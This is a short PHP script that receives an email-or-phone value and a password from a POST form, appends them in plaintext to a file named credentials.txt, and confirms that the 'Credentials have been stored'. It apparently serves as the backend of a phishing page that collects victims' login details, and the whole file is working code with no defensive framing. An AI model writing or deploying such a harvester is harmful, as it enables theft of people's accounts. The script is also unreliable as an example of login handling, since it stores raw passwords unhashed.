<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $data = "Email/Phone: " . $email . " | Password: " . $password . "\n";

    // Specify the file where credentials will be stored
    $file = 'credentials.txt';

    // Write the credentials to the file
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    echo "Credentials have been stored successfully.";
} else {
    echo "Invalid request method.";
}
?>
